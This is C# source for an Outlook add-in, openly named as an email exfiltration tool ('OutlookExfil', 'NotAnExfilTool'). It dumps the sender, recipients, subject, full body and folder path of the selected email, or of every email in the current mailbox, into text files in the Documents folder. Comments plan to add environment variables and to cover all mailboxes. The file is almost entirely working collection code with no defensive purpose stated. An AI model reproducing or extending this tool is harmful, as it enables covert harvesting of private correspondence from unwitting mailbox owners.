using Microsoft.Office.Interop.Outlook;
using System;
using System.IO;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace OutlookExfil
{
    class NotAnExfilTool
    {

        private MAPIFolder _currentFolder;
        private MAPIFolder CurrentFolder
        {
            get
            {
                if (_currentFolder == null)
                {
                    _currentFolder = Application.ActiveExplorer().CurrentFolder;
                }
                return _currentFolder;
            }
        }
        private Microsoft.Office.Interop.Outlook.Application _application;
        private Microsoft.Office.Interop.Outlook.Application Application
        {

            get
            {
                if (_application == null)
                {
                    _application = Globals.ThisAddIn.Application;
                }
                return _application;
            }
        }
        public void ExfilTool(string outFileName, MailItem item)
        // sends subj, rec, sender, body, received time, folder path of all items passed to function
        // to a text file in documents folder
        // 
        // to do: add environment variables to exfil info
        {
            if (CurrentFolder.DefaultItemType != OlItemType.olMailItem)
            {
            }
            else
            {
                if (item is MailItem)
                {
                    MailItem mailItem = (MailItem)item;
                    string mailBody;
                    switch (mailItem.BodyFormat)
                    {
                        case OlBodyFormat.olFormatHTML:
                            mailBody = mailItem.HTMLBody;
                            break;
                        case OlBodyFormat.olFormatRichText:
                            mailBody = mailItem.RTFBody;
                            break;
                        case OlBodyFormat.olFormatPlain:
                        case OlBodyFormat.olFormatUnspecified:
                        default:
                            mailBody = mailItem.Body;
                            break;
                    }
                    var mailOutput = string.Format("{0},{1},{2},{3},{4},{5}", mailItem.SenderEmailAddress, mailItem.Recipients, mailItem.SentOn.ToString(), mailItem.Subject, mailBody, CurrentFolder.FolderPath);
                    string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, outFileName), true))
                    {
                        outputFile.WriteLine(mailOutput);
                    }

                }
            }
        }
        public void ExfilToolCurrentMailbox()
            // sends subj, rec, sender, body, received time, folder path of all items in
            // currently selected mailbox to a text file in documents folder
            // to do: add environment variables to exfil info
        {
            if (CurrentFolder.DefaultItemType != OlItemType.olMailItem)
            {
            }
            else
            {
                foreach (var item in CurrentFolder.Items)
                {
                    if (item is MailItem)
                    {
                        MailItem mailItem = (MailItem)item;
                        string mailBody;
                        switch (mailItem.BodyFormat)
                        {
                            case OlBodyFormat.olFormatHTML:
                                mailBody = mailItem.HTMLBody;
                                break;
                            case OlBodyFormat.olFormatRichText:
                                mailBody = mailItem.RTFBody;
                                break;
                            case OlBodyFormat.olFormatPlain:
                            case OlBodyFormat.olFormatUnspecified:
                            default:
                                mailBody = mailItem.Body;
                                break;
                        }
                        var mailOutput = string.Format("{0},{1},{2},{3},{4},{5}", mailItem.SenderEmailAddress, mailItem.Recipients, mailItem.SentOn.ToString(), mailItem.Subject, mailBody, CurrentFolder.FolderPath);
                        string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "EmailsCurrentMailbox.txt"), true))
                        {
                            outputFile.WriteLine(mailOutput);
                        }

                    }
                }
            }
        }
        public void ExfilToolSingle()
        // sends subj, rec, sender, body, received time, folder path of
        // currently selected email to a text file in documents folder
        // to do: add environment variables to exfil info
        {
            if (CurrentFolder.DefaultItemType != OlItemType.olMailItem)
            {
            }
            else
            {
                MailItem item = this.Application.ActiveExplorer().Selection[1] as MailItem;
                if (item is MailItem)
                    {
                        MailItem mailItem = (MailItem)item;
                        string mailBody;
                        switch (mailItem.BodyFormat)
                        {
                            case OlBodyFormat.olFormatHTML:
                                mailBody = mailItem.HTMLBody;
                                break;
                            case OlBodyFormat.olFormatRichText:
                                mailBody = mailItem.RTFBody;
                                break;
                            case OlBodyFormat.olFormatPlain:
                            case OlBodyFormat.olFormatUnspecified:
                            default:
                                mailBody = mailItem.Body;
                                break;
                        }
                        var mailOutput = string.Format("{0},{1},{2},{3},{4},{5}", mailItem.SenderEmailAddress, mailItem.Recipients, mailItem.SentOn.ToString(), mailItem.Subject, mailBody, CurrentFolder.FolderPath);
                        string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "EmailsSingleSelect.txt"), true))
                        {
                            outputFile.WriteLine(mailOutput);
                        }

                    }
            }
        }
        public void ExfilToolAllMailboxes()
        {
            // to do
            // exfil all mailboxes
        }
    }
}